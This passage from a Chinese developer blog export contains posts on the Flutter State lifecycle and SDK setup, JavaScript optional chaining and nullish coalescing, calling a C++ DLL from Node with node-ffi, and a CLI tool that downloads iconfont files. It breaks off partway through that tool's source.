<p>** 状态生命周期 **</p>
<img src="/posts/2a2a7e8a/FlutterState.png" class="" title="Flutter运行">

<p>** 生命周期有四种状态： **</p>
<p>created：当 State 对象被创建时候，State.initState 方法会被调用；</p>
<p>initialized：当 State 对象被创建，但还没有准备构建时，State.didChangeDependencies 在这个时候会被调用；</p>
<p>ready：State 对象已经准备好了构建，State.dispose 没有被调用的时候；</p>
<p>defunct：State.dispose 被调用后，State 对象不能够被构建。</p>
<p>** 完整生命周期如下： **</p>
<ol>
<li><p>创建一个 State 对象时，会调用 StatefulWidget.createState；</p>
</li>
<li><p>和一个 BuildContext 相关联，可以认为被加载了（mounted）；</p>
</li>
<li><p>调用 initState；</p>
</li>
<li><p>调用 didChangeDependencies；</p>
</li>
<li><p>经过上述步骤，State 对象被完全的初始化了，调用 build；</p>
</li>
<li><p>如果有需要，会调用 didUpdateWidget；</p>
</li>
<li><p>如果处在开发模式，热加载会调用 reassemble；</p>
</li>
<li><p>如果它的子树（subtree）包含需要被移除的 State 对象，会调用 deactivate；</p>
</li>
<li><p>调用 dispose,State 对象以后都不会被构建；</p>
</li>
<li><p>当调用了 dispose,State 对象处于未加载（unmounted），已经被 dispose 的 State 对象没有办法被重新加载（remount）。</p>
</li>
</ol>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol>
<li>克隆 Flutter 仓库到本地</li>
</ol>
<blockquote>
<p>git clone -b master <a href="https://github.com/flutter/flutter.git">https://github.com/flutter/flutter.git</a></p>
</blockquote>
<ol start="2">
<li>配置环境变量</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PUB_HOSTED_URL=https://pub.flutter-io.cn //国内用户需要设置</span><br><span class="line"><span class="built_in">export</span> FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn //国内用户需要设置</span><br><span class="line"><span class="built_in">export</span> FLUTTER_HOME= // 设置Flutter SDK 目录</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$FLUTTER_HOM</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>执行命令检测 Flutter 依赖， 需要科学上网（这样会自动下载）</li>
</ol>
<blockquote>
<p>flutter doctor</p>
</blockquote>
]]></content>
      <categories>
        <category>true</category>
      </categories>
      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript新语法</title>
    <url>/posts/ccdacdfe/</url>
    <content><![CDATA[<h2 id="Js-第三阶段的新语法"><a href="#Js-第三阶段的新语法" class="headerlink" title="Js 第三阶段的新语法"></a>Js 第三阶段的新语法</h2><p>主要介绍 2 个处于 Statge 3 的新语法，目前该语法可以使用 babel 插件进行使用。这两个新语法分别是：</p>
<ul>
<li>proposal-optional-chaining</li>
<li>proposal-nullish-coalescing</li>
</ul>
<a id="more"></a>

<h2 id="proposal-optional-chaining"><a href="#proposal-optional-chaining" class="headerlink" title="proposal-optional-chaining"></a>proposal-optional-chaining</h2><p>TC39 - 提案 地址： <a href="https://github.com/tc39/proposal-optional-chaining">https://github.com/tc39/proposal-optional-chaining</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: &#123;</span><br><span class="line">      d: &#123;</span><br><span class="line">        e: <span class="number">0</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="旧语法-取值"><a href="#旧语法-取值" class="headerlink" title="旧语法 取值"></a>旧语法 取值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a &amp;&amp; a.b &amp;&amp; a.b.c &amp;&amp; a.b.c.d &amp;&amp; a.b.c.d.e ? a.b.c.d.e : <span class="string">&quot;--&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue); <span class="comment">// 输出 --</span></span><br></pre></td></tr></table></figure>

<h3 id="新语法-取值"><a href="#新语法-取值" class="headerlink" title="新语法 取值"></a>新语法 取值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.e || <span class="string">&quot;--&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue); <span class="comment">// 输出 --</span></span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以 <strong>“极少、完美、可阅读”</strong> 的代码量，实现了最完美的深度取值的问题。可是观察上面的代码方案时，还是不够完美。如果某个用户的余额就是 0 的化，那么岂不是界面上展示的是 <strong>“–”</strong>。不科学、不科学，继续阅读，揭开疑惑！</p>
<h2 id="proposal-nullish-coalescing"><a href="#proposal-nullish-coalescing" class="headerlink" title="proposal-nullish-coalescing"></a>proposal-nullish-coalescing</h2><p>TC39 - 提案 地址： <a href="https://github.com/tc39/proposal-nullish-coalescing">https://github.com/tc39/proposal-nullish-coalescing</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: &#123;</span><br><span class="line">      d: &#123;</span><br><span class="line">        e: <span class="number">0</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="旧语法-显示余额为-0"><a href="#旧语法-显示余额为-0" class="headerlink" title="旧语法 显示余额为 0"></a>旧语法 显示余额为 0</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.d?.e === <span class="number">0</span> ? <span class="number">0</span> : a.b?.c?.d?.e;</span><br><span class="line"><span class="built_in">console</span>.log(eValue); <span class="comment">// 输出 0</span></span><br></pre></td></tr></table></figure>

<h3 id="新语法-显示余额为-0"><a href="#新语法-显示余额为-0" class="headerlink" title="新语法 显示余额为 0"></a>新语法 显示余额为 0</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.d?.e ?? <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue); <span class="comment">// 输出 0</span></span><br></pre></td></tr></table></figure>

<h2 id="如何接到已有的项目中"><a href="#如何接到已有的项目中" class="headerlink" title="如何接到已有的项目中"></a>如何接到已有的项目中</h2><ul>
<li>升级 eslint-loader 因为低版本的不支持新语法检查</li>
<li>升级为 babel7</li>
<li>安装 babel</li>
</ul>
<h2 id="安装-Babel-插件"><a href="#安装-Babel-插件" class="headerlink" title="安装 Babel 插件"></a>安装 Babel 插件</h2><blockquote>
<p>@babel/plugin-proposal-optional-chaining</p>
</blockquote>
<blockquote>
<p>@babel/plugin-proposal-nullish-coalescing-operator</p>
</blockquote>
]]></content>
      <categories>
        <category>js</category>
        <category>node</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Muniz CLI ( 一 )</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<h1 id="muniz-脚手架"><a href="#muniz-脚手架" class="headerlink" title="muniz 脚手架"></a>muniz 脚手架</h1><a id="more"></a>
]]></content>
      <categories>
        <category>js</category>
        <category>node</category>
        <category>cli</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>node-dll 调用</title>
    <url>/posts/cf777cb3/</url>
    <content><![CDATA[<h3 id="DLL介绍"><a href="#DLL介绍" class="headerlink" title="DLL介绍"></a>DLL介绍</h3><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
<h3 id="Node-怎么调用DLL"><a href="#Node-怎么调用DLL" class="headerlink" title="Node 怎么调用DLL"></a>Node 怎么调用DLL</h3><p>使用 node-ffi 模块，非常灵活的node中去调用dll中暴露的方法。</p>
<a id="more"></a>

<h3 id="安装node-ffi模块"><a href="#安装node-ffi模块" class="headerlink" title="安装node-ffi模块"></a>安装node-ffi模块</h3><blockquote>
<p><a href="https://github.com/nodejs/node-gyp">Node-gyp</a><br><a href="https://github.com/nodejs/node-gyp">https://github.com/nodejs/node-gyp</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/node-ffi/node-ffi">Node-ffi</a><br><a href="https://github.com/node-ffi/node-ffi">https://github.com/node-ffi/node-ffi</a></p>
</blockquote>
<blockquote>
<p>安装命令  npm install ffi</p>
</blockquote>
<p>** 在安装node-ffi模块前，必须保证node-gyp 安装成功，并且node-gyp可以使用 **</p>
<h3 id="安装node-ffi-遇到的坑"><a href="#安装node-ffi-遇到的坑" class="headerlink" title="安装node-ffi 遇到的坑"></a>安装node-ffi 遇到的坑</h3><p>如果安装成功了，就看看我是怎么解决这个坑的吧。</p>
<p>不知道是怎么回事，每次安装ffi模块，都会导致 node-gyp build  V8类型出错。</p>
<p>** 解决方法：**<br>直接克隆node-ffi仓库到本地，把node-ffi 放到全局的 node-modules中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/node-ffi/node-ffi.git </span><br></pre></td></tr></table></figure>

<p>再进入CMD命令窗口中，执行** npm install node-ffi –g **,即可成功安装。<br>安装完后，全局的 node-modules中会出现 快捷方式的 ffi文件夹。<br>需要创建一个ffi文件夹，并把快捷方式的 ffi文件夹内容剪切到 新的 ffi文件夹中，也就是去掉快捷方式即可。</p>
<h3 id="开发DLL"><a href="#开发DLL" class="headerlink" title="开发DLL"></a>开发DLL</h3><blockquote>
<p>开发DLL工具，我使用的是VS2015。</p>
</blockquote>
<p>** 步骤：b**</p>
<p>开发DLL工具，我使用的是VS2015。<br>打开** VS2015 ** -&gt; ** 文件 ** -&gt; ** 新建 ** -&gt; ** 项目 ** -&gt; ** 选择Win32控制台应用程序 **</p>
<img src="/posts/cf777cb3/node-dll-1.png" class="" title="创建项目">

<img src="/posts/cf777cb3/node-dll-2.png" class="" title="应用程序向导">

<p>选择 ** 下一步 **</p>


<p>选择 ** 控制台应用程序 空项目 ** 最后点击 ** 完成 **</p>
<img src="/posts/cf777cb3/node-dll-4.png" class="" title="应用程序向导">

<p>右击** nodeFile ** 项目名称，选择 ** 添加 ** -&gt; ** 新建项 **</p>
<img src="/posts/cf777cb3/node-dll-5.png" class="" title="应用程序向导">

<p>选择 ** 头文件 **，名称我写的 ** fileChange.h **点击添加</p>
<p>同理，相同的步骤创建C++文件（.cpp），名称fileChange.cpp 点击添加</p>
<p>在源文件 ** fileChange.cpp ** 中编写代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fileChange.cpp </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fileChange.h&quot;</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//同步函数，求和方法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> i + j;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">//异步函数，求和方法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addSync</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">void</span> (*callfuct)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = i + j;</span><br><span class="line">		callfuct(sum, j);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>在头文件 ** fileChange.h ** 中编写代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  fileChange.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">addSync</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">void</span> (*callfuct)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))</span></span>;</span><br></pre></td></tr></table></figure>
<p>在这里必须使用，** extern “C” ** 让编译器使用C解析方法去导出DLL，不然node-ffi模块识别不了。</p>
<h3 id="生成DLL"><a href="#生成DLL" class="headerlink" title="生成DLL"></a>生成DLL</h3><p>因为我的电脑环境是64位，node也是64位，所以我导出的dll也需要是64位，不然node-ffi也是调用不成功。</p>
<p>** 导出方法： **</p>
<img src="/posts/cf777cb3/node-dll-6.png" class="" title="导出方法">

<p>导出的dll文件在在项目目录下的 \x64\Debug 中，即可找到 nodeFile.dll动态链接库文件。</p>
<img src="/posts/cf777cb3/node-dll-7.png" class="" title="应用程序向导">

<h3 id="node使用DLL"><a href="#node使用DLL" class="headerlink" title="node使用DLL"></a>node使用DLL</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//导入ffi模块</span></span><br><span class="line"><span class="keyword">var</span> ffi = <span class="built_in">require</span>(<span class="string">&#x27;ffi&#x27;</span>);</span><br><span class="line"><span class="comment">//使用ffi.Library加载dll, 第一个参赛是库文件路径，第二个参数是JSON格式，用于定义使用的dll方法。</span></span><br><span class="line"><span class="comment">//int 表示整形，pointer 表示 指针地址，也可以使用 int * 表示。</span></span><br><span class="line"><span class="keyword">var</span> libm = ffi.Library(<span class="string">&#x27;./../dll/nodeFlie&#x27;</span>, &#123;</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>: [ <span class="string">&#x27;int&#x27;</span>, [ <span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span> ] ],</span><br><span class="line">  <span class="string">&#x27;addSync&#x27;</span>: [<span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用方法</span></span><br><span class="line"><span class="keyword">const</span> sum = libm.add(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义 回调函数</span></span><br><span class="line"><span class="keyword">let</span> addCallback = ffi.Callback(<span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>], <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a,b);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行回调的 dll方法</span></span><br><span class="line">libm.addSync(<span class="number">2</span>,<span class="number">3</span>,addCallback);</span><br><span class="line"></span><br><span class="line">执行结果：</span><br><span class="line"></span><br><span class="line">PS E:\nodejsproject\node-fileChangeAttr\src&gt; node .\index.js</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">5</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>node</tag>
        <tag>dll</tag>
      </tags>
  </entry>
  <entry>
    <title>okcoin-cli 辅助</title>
    <url>/posts/5da3d5f3/</url>
    <content><![CDATA[<h3 id="okIcon"><a href="#okIcon" class="headerlink" title="okIcon"></a><a href="https://github.com/1160007652/okIcon">okIcon</a></h3><p><a href="https://github.com/1160007652/okIcon">okIcon</a>是一个自动获取阿里iconfont的一个助手，只需要第一次使用安装是初始化，后续一个命令自动下载释放。</p>
<h4 id="使用的模块"><a href="#使用的模块" class="headerlink" title="使用的模块"></a>使用的模块</h4><p>fs node自带 文件库<br><a href="https://www.npmjs.com/package/fs-extra">fs-extra</a> 第三方文件库<br><a href="https://www.npmjs.com/package/commander">commander</a> 命令行指令解决方案模块<br><a href="https://www.npmjs.com/package/inquirer">inquirer</a> 命令行交互模块<br><a href="https://www.npmjs.com/package/request">request</a> 网络访问库<br><a href="https://www.npmjs.com/package/log-symbols">log-symbols</a> 命令行输出图标<br><a href="https://www.npmjs.com/package/chalk">chalk</a> 命令行文字颜色<br><a href="https://www.npmjs.com/package/cross-spawn">cross-spawn</a> 跨平台shell执行<br><a href="https://www.npmjs.com/package/walk">walk</a> 目录、文件遍历库</p>
<a id="more"></a>

<h3 id="制作okcoin"><a href="#制作okcoin" class="headerlink" title="制作okcoin"></a>制作okcoin</h3><h4 id="接收命令行参数"><a href="#接收命令行参数" class="headerlink" title="接收命令行参数"></a>接收命令行参数</h4><p>如： npm init -y ,这里 init -y 就是执行命令是传入的参数，每个参数都是空格隔开的。<br>如下代码，我定义了4个指令， 分别是 -v -i -d –help , 对应的指令对应相应的函数去执行不同的功能。-v是查看版本、-i初始化、-d下载是否文件、- -help 查看帮助。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">program.version(<span class="string">&#x27;1.0.0&#x27;</span>, <span class="string">&#x27;-v, --version&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-i, --init&#x27;</span>, <span class="string">&#x27;初始化配置文件&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-d, --download&#x27;</span>, <span class="string">&#x27;下载iconfont文件&#x27;</span>)</span><br><span class="line">    .description(<span class="string">&#x27;自动下载IconFont助手&#x27;</span>);</span><br><span class="line"></span><br><span class="line">program.on(<span class="string">&#x27;--help&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;\n-------------------------------------\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;先使用 okIcon -i 进行初始化\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;后续iconfont的改动，使用 okIcon -d 进行下载\n&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">program.parse(process.argv);</span><br></pre></td></tr></table></figure>

<h4 id="交互式操作"><a href="#交互式操作" class="headerlink" title="交互式操作"></a>交互式操作</h4><p>如果执行了指令 <strong>-i</strong> ,那么就会触发inquirer方法。提示用户输入对应的信息。做初始化配置作用！</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.init</span>)</span>&#123;</span><br><span class="line">    inquirer.prompt([&#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconAddr&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入iconfont的项目下载地址:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconCookies&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入iconfont的Cookies:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconPath&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入保存iconfont的绝对路径:\n&#x27;</span></span><br><span class="line">    &#125;]).then(<span class="function">(<span class="params">answers</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;iconAddr,iconCookies,iconPath&#125; = answers;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">setIconInfo(iconAddr,iconCookies,iconPath)</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&#x27;设置完毕，开始下载&#x27;</span>));</span><br><span class="line">            getIconfont();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.error, chalk.red(<span class="string">&#x27;设置失败,再试一次&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ruquest携带自定义cookie"><a href="#ruquest携带自定义cookie" class="headerlink" title="ruquest携带自定义cookie"></a>ruquest携带自定义cookie</h4><p>封装request请求为同步方法，至于怎么传入cookie,都放到hearders字断中即可。完了使用pipe管道释放iconfont字节集数据到对应的目录即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestSync</span>(<span class="params">url, cookies</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> options = &#123;</span><br><span class="line">            url: url,</span><br><span class="line">            headers: &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36`</span>,</span><br><span class="line">            Cookie: cookies</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        request(options,<span class="function"><span class="keyword">function</span>(<span class="params">e,r,b</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                resolve(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).pipe(fs.createWriteStream(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件遍历封装"><a href="#文件遍历封装" class="headerlink" title="文件遍历封装"></a>文件遍历封装</h4><p>其实也不能说是封装，主要是说下这个walker库。<br>walk.walk(); 要传入遍历查询的根目录。返回一个 walker执行对象。<br>剩下的只需要 walker.on(‘事件’,（root, fileStats, next); 这个模块还是设计比较舒服的。有koa 洋葱模型的思想。fileStatus 是遍历处文件的一系列信息，next()执行下一个。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveIconfont</span>(<span class="params">iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> walker = walk.walk(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">    <span class="keyword">const</span> iconFiles = [<span class="string">&#x27;iconfont.css&#x27;</span>, <span class="string">&#x27;iconfont.eot&#x27;</span>, <span class="string">&#x27;iconfont.js&#x27;</span>, <span class="string">&#x27;iconfont.svg&#x27;</span>, <span class="string">&#x27;iconfont.ttf&#x27;</span>, <span class="string">&#x27;iconfont.woff&#x27;</span>];</span><br><span class="line">    walker.on(<span class="string">&quot;file&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">root, fileStats, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (iconFiles.includes(fileStats.name))&#123;</span><br><span class="line">            fse.moveSync(<span class="string">`<span class="subst">$&#123;root&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, <span class="string">`<span class="subst">$&#123;iconPath&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, &#123; <span class="attr">overwrite</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    walker.on(<span class="string">&quot;errors&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">root, nodeStatsArray, next</span>) </span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    walker.on(<span class="string">&quot;end&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&quot;下载完毕&quot;</span>));</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>okIcon<a href="https://github.com/1160007652/okIcon">GitHub</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fse = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> program = <span class="built_in">require</span>(<span class="string">&#x27;commander&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> inquirer = <span class="built_in">require</span>(<span class="string">&#x27;inquirer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> logSymbols = <span class="built_in">require</span>(<span class="string">&#x27;log-symbols&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> chalk = <span class="built_in">require</span>(<span class="string">&#x27;chalk&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;cross-spawn&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> walk = <span class="built_in">require</span>(<span class="string">&#x27;walk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> configPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../config.ini`</span>;</span><br><span class="line"></span><br><span class="line">program.version(<span class="string">&#x27;1.0.0&#x27;</span>, <span class="string">&#x27;-v, --version&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-i, --init&#x27;</span>, <span class="string">&#x27;初始化配置文件&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-d, --download&#x27;</span>, <span class="string">&#x27;下载iconfont文件&#x27;</span>)</span><br><span class="line">    .description(<span class="string">&#x27;自动下载IconFont助手&#x27;</span>);</span><br><span class="line"></span><br><span class="line">program.on(<span class="string">&#x27;--help&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;\n-------------------------------------\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;先使用 okIcon -i 进行初始化\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;后续iconfont的改动，使用 okIcon -d 进行下载\n&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">program.parse(process.argv);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.init</span>)</span>&#123;</span><br><span class="line">    inquirer.prompt([&#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconAddr&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入iconfont的项目下载地址:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconCookies&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入iconfont的Cookies:\n&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        type: <span class="string">&#x27;input&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;iconPath&#x27;</span>,</span><br><span class="line">        message: <span class="string">&#x27;请输入保存iconfont的绝对路径:\n&#x27;</span></span><br><span class="line">    &#125;]).then(<span class="function">(<span class="params">answers</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;iconAddr,iconCookies,iconPath&#125; = answers;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">setIconInfo(iconAddr,iconCookies,iconPath)</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&#x27;设置完毕，开始下载&#x27;</span>));</span><br><span class="line">            getIconfont();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.error, chalk.red(<span class="string">&#x27;设置失败,再试一次&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">program.download</span>)</span>&#123;</span><br><span class="line">    